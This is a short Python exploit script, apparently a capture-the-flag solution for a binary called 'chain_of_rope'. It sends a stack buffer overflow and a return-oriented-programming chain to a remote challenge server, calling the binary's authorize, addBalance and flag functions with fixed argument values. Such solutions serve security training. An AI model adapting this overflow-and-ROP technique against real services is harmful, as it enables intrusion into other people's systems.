from ptrlib import *

elf = ELF("./chain_of_rope")
#sock = Process("./chain_of_rope")
sock = Socket("shell.actf.co", 19400)

rop_pop_rdi = 0x00401403
rop_pop_rsi_r15 = 0x00401401

sock.sendline("1")

payload = b'A' * 0x38
payload += p64(elf.symbol("authorize"))
payload += p64(rop_pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(elf.symbol("addBalance"))
payload += p64(rop_pop_rsi_r15)
payload += p64(0xbedabb1e)
payload += p64(0xaaaabbbb)
payload += p64(rop_pop_rdi)
payload += p64(0xba5eba11)
payload += p64(elf.symbol("flag"))
sock.sendline(payload)

sock.interactive()
